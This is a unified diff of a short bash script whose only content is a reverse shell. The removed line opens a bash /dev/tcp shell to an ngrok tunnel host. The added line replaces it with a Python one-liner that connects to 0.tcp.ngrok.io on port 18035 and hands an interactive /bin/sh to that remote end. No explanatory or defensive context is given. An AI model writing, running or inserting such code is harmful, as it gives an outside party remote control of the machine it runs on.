@@ -1,4 +1,5 @@
 #!/bin/bash
-bash -c 'bash -i >& /dev/tcp/0.tcp.jp.ngrok.io/18035 0>&1'
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("0.tcp.ngrok.io",18035));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
 
 
